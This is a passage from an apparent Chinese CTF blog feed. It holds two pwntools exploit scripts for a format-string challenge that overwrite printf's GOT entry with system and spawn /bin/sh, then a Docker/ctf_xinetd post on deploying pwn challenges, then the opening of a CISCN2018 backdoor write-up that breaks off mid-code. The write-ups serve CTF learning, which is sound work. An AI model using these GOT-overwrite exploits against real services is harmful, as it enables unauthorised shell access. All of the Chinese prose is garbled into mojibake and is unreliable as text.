ä¸ºrecvï¼ˆï¼‰ä¸€æ¬¡æœ€å¤šåªèƒ½æ¥æ”¶0x1000ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦è¿›è¡Œå¤šæ¬¡recvï¼ˆï¼‰æ‰èƒ½ä¿è¯å…¨éƒ¨å­—èŠ‚éƒ½è¾“å‡ºä»¥ä¾¿è¿›è¡Œä¸‹é¢çš„æ“ä½œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¦æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²â€œ23r3fâ€æ¥ä½œæ ‡å¿—ï¼Œè¿”å›çš„å¤§é‡å­—ç¬¦ä¸²ä¸­å¦‚æœåŒ…å«äº†è¿™ä¸ªå­—ç¬¦ä¸²é‚£ä¹ˆè¯´æ˜ä¹‹å‰æ„é€ çš„%nå†™å…¥å·²ç»å®Œæˆ'''</span> payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_11 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_11</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_11 = prinf_got + 2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"******leaking the print_got_add*********"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'aaaa%7$s'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"print_got_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> printf_addr <span class="token operator">-</span> printf_libc <span class="token operator">+</span> system_libclog<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%7$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%11$hn'</span><span class="token triple-quoted-string string">'''è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬æŠŠsystemçš„åœ°å€çš„å‰åä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«å†™åˆ°fmt-7å’Œfmt-11ä¸­ï¼Œåœ¨å†™å…¥åä¸¤ä¸ªå­—èŠ‚çš„æ—¶å€™è¦æ³¨æ„å‡å»å‰é¢è¾“å…¥çš„(system_addr &amp;0xffff))ï¼Œè¿™æ˜¯å› ä¸º%nå†™å…¥æ“ä½œæ˜¯ç®—ç´¯ç§¯è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°'''</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¿™ä¸ªæ—¶å€™è¾“å…¥å‚æ•°åˆ°æ ˆä¸­ï¼Œæœ¬æ¥ä¸‹ä¸€æ­¥ç¨‹åºä¼šè°ƒç”¨printfå‡½æ•°ï¼Œä½†æ˜¯æ­¤æ—¶printfå‡½æ•°çš„gotè¡¨å·²ç»è¢«ä¿®æ”¹ä¸ºsystemçš„åœ°å€äº†ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡Œsystemå¹¶ä¸”ä»æ ˆä¸­å–bin/shå‚æ•°äºæ˜¯å°±è¿™æ ·getshell'''</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#veritas501 --exp</span><span class="token comment" spellcheck="true">#coding = utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'terminator'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>p_printf <span class="token operator">=</span> <span class="token number">0x0804A010</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">'%6$x'</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>p_ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>p_7 <span class="token operator">=</span> p_ebp2<span class="token number">-0xc</span><span class="token comment" spellcheck="true">#7</span>p_11 <span class="token operator">=</span> p_ebp2<span class="token operator">+</span><span class="token number">4</span><span class="token comment" spellcheck="true">#11</span>p_ebp1 <span class="token operator">=</span> p_ebp2<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#6</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_7<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_7</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_printf<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_7->p_printf</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_11<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_11</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>p_printf<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_11->p_printf+2</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'here\x00'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"aaaa%7$s\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>printf <span class="token operator">=</span> u32<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>printf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak printf</span>system <span class="token operator">=</span> printf<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%7$hn"</span> pay <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%11$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#hijack printf->system</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æœ‰ç‚¹æ‡µï¼Œå¥½å¥½æ¶ˆåŒ–ã€‚</p><p>åŸæ¥å„å¤„çš„&amp;ffffï¼Œä¸å•å•æ˜¯ä¸ºäº†åŒ¹é…åé¢çš„%$hnè§£å¼•ç”¨å†™ä¸¤ä¸ªå­—èŠ‚ï¼Œè€Œæ˜¯ï¼Œè¿™ç§å†™çš„æ–¹å¼å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯å°†æ‰€æŒ‡å®šçš„å†…å­˜ç©ºé—´çš„å‰ä¸¤ä¸ªå­—èŠ‚æ¢æˆæˆ‘ä»¬è¦å†™çš„å€¼ã€‚</p><p>å¦‚<code>&quot;%&quot;+str(p_11&amp;0xffff)+&quot;c%6$hn\x00&quot;</code>ï¼Œåˆ™è¡¨ç¤ºå°†å‘æ ˆç©ºé—´åç§»é‡6çš„ä½ç½®çš„å‰ä¸¤ä¸ªå­—èŠ‚å†™æˆ<code>p_11&amp;0xffff</code>ï¼Œå³åŸæ•°æ®è‹¥ä¸º<code>0x12345678</code>ï¼Œç»è¿‡æ“ä½œåå˜ä¸ºäº†<code>0x12340000+p_11&amp;0xffff</code>ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-åæœˆ31-Hitcon-äº”&quot;&gt;&lt;a href=&quot;#Pwn-åæœˆ31-Hitcon-äº”&quot; class=&quot;headerlink&quot; title=&quot;Pwn-åæœˆ31-Hitcon-äº”&quot;&gt;&lt;/a&gt;Pwn-åæœˆ31-Hitcon-äº”&lt;/h1&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²</title>
    <link href="http://www.yof3ng.xyz/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    <id>http://www.yof3ng.xyz/2018/10/30/Pwné¢˜ç¯å¢ƒéƒ¨ç½²/</id>
    <published>2018-10-30T15:15:43.000Z</published>
    <updated>2018-10-30T16:11:17.499Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²"><a href="#ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²"></a>ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²</h1><blockquote><p>ğŸ˜„dockeræ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨CTFæ¯”èµ›ä¸­æˆ‘ä»¬å¯ä»¥ç»å¸¸é‡åˆ°é€šè¿‡dockeréƒ¨ç½²çš„webï¼Œæˆ–è€…Pwnç¯å¢ƒï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸€äº›æœåŠ¡éƒ¨ç½²åœ¨dockeré‡Œé¢ï¼Œç®¡ç†æ–¹ä¾¿ï¼Œå¹¶ä¸”è¾ƒä¸ºå®‰å…¨ã€‚</p><p>é€šè¿‡dockeræˆ‘ä»¬å¯ä»¥è‡ªå·±åˆ›å»ºé•œåƒï¼Œæˆ–è€…æ‹‰å–é•œåƒï¼Œæ¯”å¦‚è¯´<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">vulapps</a>ä¸Šé¢çš„é¶æœºï¼Œè¿˜æœ‰è¿™æ¬¡è¦è®²çš„ç®€å•çš„Pwnç¯å¢ƒéƒ¨ç½²æ¡†æ¶ã€‚</p><p>è¿™é‡Œæœ‰Angel_kittyå¸ˆå‚…å†™çš„ä¸€ä»½è¶…è¯¦ç»†dockeræ•™ç¨‹ã€‚<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9789130.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p></blockquote><h2 id="Docker-å®‰è£…"><a href="#Docker-å®‰è£…" class="headerlink" title="Docker å®‰è£…"></a>Docker å®‰è£…</h2><h3 id="1-aptå®‰è£…"><a href="#1-aptå®‰è£…" class="headerlink" title="1.aptå®‰è£…"></a>1.aptå®‰è£…</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> docker docker-compose</code></pre><h3 id="2-æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…"><a href="#2-æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…" class="headerlink" title="2.æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…"></a>2.æ‰‹åŠ¨ä¸‹è½½å¹¶ä¸”å®‰è£…</h3><p><a href="https://download.docker.com/linux/debian/dists/" target="_blank" rel="noopener">ä¸‹è½½é“¾æ¥</a></p><p>ä¸‹è½½å®Œæˆåè¿›å…¥å®‰è£…æŠ¥æ‰€åœ¨çš„ç›®å½•ï¼Œå¹¶ä¸”æ‰§è¡Œä¸€ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#dbkg -i filename</span>dpkg -i docker-ce_17.03.1~ce-0~debian-jessie_amd64.deb</code></pre><h3 id="3-åˆ‡æ¢é•œåƒæº"><a href="#3-åˆ‡æ¢é•œåƒæº" class="headerlink" title="3.åˆ‡æ¢é•œåƒæº"></a>3.åˆ‡æ¢é•œåƒæº</h3><p>vim /etc/docker/daemon.json</p><pre class=" language-shell"><code class="language-shell">cat > /etc/docker/daemon.json << EOF{  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]}EOFservice docker restart</code></pre><h2 id="Docker-ç®€å•ä½¿ç”¨"><a href="#Docker-ç®€å•ä½¿ç”¨" class="headerlink" title="Docker ç®€å•ä½¿ç”¨"></a>Docker ç®€å•ä½¿ç”¨</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ æ¡å‘½ä»¤ç®€å•æµ‹è¯•ä¸€ä¸‹dockeræ˜¯å¦å®‰è£…æˆåŠŸï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#å¯åŠ¨docker</span><span class="token function">service</span> docker startdocker images<span class="token comment" spellcheck="true">#hello-worldä¸ºå…¶è‡ªå¸¦çš„ä¸€ä¸ªimage</span>docker run hello-world</code></pre><p>ä»¥åŠä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼Œå¯ä»¥è®°å½•ä¸€ä¸‹ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#æŸ¥çœ‹æœ¬åœ°å·²æœ‰é•œåƒ</span>docker images<span class="token comment" spellcheck="true">#è¿è¡Œé•œåƒå¹¶è¿›å…¥</span>docker run -i -t httpd /bin/bash<span class="token comment" spellcheck="true">#åå°è¿è¡Œé•œåƒï¼Œé•œåƒ8080ç«¯å£æ˜ å°„åˆ°ä¸»æœº80ç«¯å£</span>docker run -d -p 80:8080 httpd<span class="token comment" spellcheck="true">#è¿›å…¥å·²æœ‰å®¹å™¨</span>docker <span class="token function">exec</span> -it <span class="token punctuation">[</span>container-id<span class="token punctuation">]</span> /bin/bash<span class="token comment" spellcheck="true">#å…³é—­é•œåƒ</span>docker stop httpd<span class="token comment" spellcheck="true">#æŸ¥çœ‹å½“å‰æ­£åœ¨è¿è¡Œçš„é•œåƒ</span>docker <span class="token function">ps</span>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</code></pre><h1 id="Pwnéƒ¨ç½²æ¡†æ¶"><a href="#Pwnéƒ¨ç½²æ¡†æ¶" class="headerlink" title="Pwnéƒ¨ç½²æ¡†æ¶"></a>Pwnéƒ¨ç½²æ¡†æ¶</h1><blockquote><p>é€šè¿‡æ¡†æ¶æˆ‘ä»¬å¯ä»¥å¿«é€Ÿåœ°éƒ¨ç½²Pwné¢˜ç¯å¢ƒï¼Œè€Œä¸ç”¨æ“å¤ªå¤šçš„å¿ƒğŸ’—ã€‚</p></blockquote><h2 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h2><p>æˆ‘ä»¬å¯ä»¥ä»githubä¸Šä¸‹è½½åˆ°<a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">ctf_xinetd</a> ï¼Œå®ƒæ˜¯å¼€æºçš„ä¸€ä¸ªé¡¹ç›®ã€‚</p><blockquote><p>#README.md</p><blockquote><p>A docker repository for deploying CTF challenges</p></blockquote><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>Put files to floder <code>bin</code>. Theyâ€™ll be copied to /home/ctf. <strong>Update the flag</strong> at the same time.</p><p>Edit <code>ctf.xinetd</code>. replace <code>./helloworld</code> to your command.</p><p>You can also edit <code>Dockerfile, ctf.xinetd, start.sh</code> to custom your environment.</p><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><pre class=" language-bash"><code class="language-bash">docker build -t <span class="token string">"helloworld"</span> <span class="token keyword">.</span></code></pre><p>DO NOT use <em>bin</em> as challengeâ€™s name</p><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><pre class=" language-bash"><code class="language-bash">docker run -d -p <span class="token string">"0.0.0.0:pub_port:9999"</span> -h <span class="token string">"helloworld"</span> --name<span class="token operator">=</span><span class="token string">"helloworld"</span> helloworld</code></pre><p><code>pub_port</code> is the port you want to expose to the public network.</p><h2 id="Capture-traffic"><a href="#Capture-traffic" class="headerlink" title="Capture traffic"></a>Capture traffic</h2><p>If you want to capture challenge traffic, just run <code>tcpdump</code> on the host. Here is an example.</p><pre class=" language-bash"><code class="language-bash">tcpdump -w helloworld.pcap -i eth0 port pub_port</code></pre></blockquote><p>å…ˆç®€å•åœ°çœ‹ä¸€ä¸‹å®ƒçš„ç›®å½•ç»“æ„ï¼š</p><p><img src="https://i.loli.net/2018/10/30/5bd87b591ea60.png" alt=""></p><p>é¦–å…ˆå°†é¡¹ç›®ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”å°†å‡†å¤‡å¥½çš„pwné¢˜å’Œflagæ”¾å…¥binæ–‡ä»¶å¤¹ä¸­ã€‚<br><img src="https://i.loli.net/2018/10/30/5bd87ba1360b7.png" alt=""></p><p>ç„¶åæˆ‘ä»¬å»ä¿®æ”¹ctf.xinetdæ–‡ä»¶ä¸­çš„é…ç½®å‚æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/30/5bd87bda03b20.png" alt=""></p><p>ç„¶åæ ¹æ®readmeæ–‡æ¡£æˆ‘ä»¬å¯ä»¥è¿›è¡Œdockerå®¹å™¨çš„å»ºç«‹ï¼Œè¿è¡Œï¼Œä¹ƒè‡³æµé‡çš„ç›‘å¬ã€‚</p><h1 id="å›½èµ›Pwnä¹‹ä¸€"><a href="#å›½èµ›Pwnä¹‹ä¸€" class="headerlink" title="å›½èµ›Pwnä¹‹ä¸€"></a>å›½èµ›Pwnä¹‹ä¸€</h1><blockquote><p>è¿˜è®°å¾—ä»Šå¹´å›½èµ›æ˜¯è®©å„æ”¯è¿›äº†åŠå†³èµ›çš„é˜Ÿä¼è¿›è¡Œå‡ºé¢˜ï¼Œé¶æ ‡è®¾ç½®ï¼Œè¿™ä¸ªç¯èŠ‚è¢«ç§°ä½œ<code>Built it</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¤ªèœäº†ï¼Œæ²¡æœ‰å‡ºé¢˜ï¼Œä¹Ÿæ²¡æœ‰å‚åŠ çš„é‚£ä¸ªå®åŠ›ï¼ŒPS:æˆ‘ä¼šè¯´æˆ‘è¿<a href="https://github.com/sherlly/ciscn2018-pwn/tree/master/checker" target="_blank" rel="noopener">checker</a>éƒ½æ²¡çœ‹æ‡‚å—ï¼Œæ›´åˆ«è¯´è¿‡checkeräº†ã€‚</p><p>é™„ä¸ŠXp0inté˜Ÿä¼å›½èµ›å‡ºçš„é¢˜è§£ï¼Œä»¥åŠPwnç¯å¢ƒï¼Œå€Ÿä»¥å‚è€ƒã€‚</p></blockquote><blockquote><p>#WP</p><h2 id="CISCN2018-May-be-a-calculator"><a href="#CISCN2018-May-be-a-calculator" class="headerlink" title="CISCN2018 : May be a calculator?"></a>CISCN2018 : May be a calculator?</h2><h2 id="Principle"><a href="#Principle" class="headerlink" title="[Principle]"></a><strong>[Principle]</strong></h2><p>backdoor</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="[Environment]"></a><strong>[Environment]</strong></h2><p>Ubuntu</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="[Tools]"></a><strong>[Tools]</strong></h2><p>gdbã€objdumpã€pythonã€pwntools</p><h2 id="Process"><a href="#Process" class="headerlink" title="[Process]"></a><strong>[Process]</strong></h2><p>è€ƒå¯ŸRPCç›¸å…³åè®®åŠé¢„ç•™åé—¨ï¼Œé€šè¿‡é€†å‘ä»£ç é€»è¾‘å¯ä»¥çœ‹åˆ°åœ¨ç¬¦åˆtypeä¸º0x6æ—¶ï¼Œéšè—äº†ä¸€ä¸ªåé—¨ï¼Œåœ¨åé—¨å‡½æ•°ä¸­é¦–å…ˆå¯¹æ¥æ”¶åˆ°çš„keyè¿›è¡Œæ£€æŸ¥ï¼Œé€šè¿‡å°†åŠ å¯†åçš„keyï¼ˆåŠ å¯†ç®—æ³•ä¸ºç®€å•çš„å¼‚æˆ–ï¼‰å’Œä¸€ä¸ªå›ºå®šå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰åˆ™æ¥æ”¶çœŸæ­£çš„payloadï¼ŒåŠ å¯†ç®—æ³•å¦‚ä¸‹ï¼š</p><pre><code>void encrypt(char* key){  int i;  int k=0;  for(i=0;i&lt;36;i++)  {    key[i]=(key[i]^k)%256;    k+=23;  